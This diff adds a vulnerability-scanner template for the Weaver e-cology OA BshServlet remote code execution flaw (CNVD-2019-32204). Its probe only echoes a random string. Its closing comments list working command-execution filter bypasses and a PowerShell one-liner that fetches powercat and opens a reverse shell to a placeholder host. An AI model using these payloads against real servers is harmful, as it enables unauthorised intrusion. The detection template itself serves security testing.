@@ -1,0 +1,52 @@
+id: fanweiOA-E-Cology-bsh_servlet_BshServlet-code-exec
+
+info:
+  name: 泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204
+  author: cnaq
+  severity: critical
+  description: 2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20BshServlet%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204.html
+  tags: fanwei,oa,ecology,cnvd,rce
+
+requests:
+  - raw:
+      - | # REQUEST 1
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        bsh.script=print("{{randstr}}");&bsh.servlet.output=raw
+        
+    attack: batteringram
+    payloads:
+      path:
+        - /weaver/bsh.servlet.BshServlet 
+        - /bsh.servlet.BshServlet
+        - /weaveroa/bsh.servlet.BshServlet
+        - /oa/bsh.servlet.BshServlet
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "{{randstr}}"
+        part: body   
+
+      - type: word
+        words:
+          - "Login.jsp"
+        part: body
+        condition: or
+        negative: true
+
+# 命令执行绕过
+# eval%00("ex"%2b"ec(\"whoami\")");
+# ex\u0065c("cmd /c dir");
+# IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd
+# bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\"command\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami
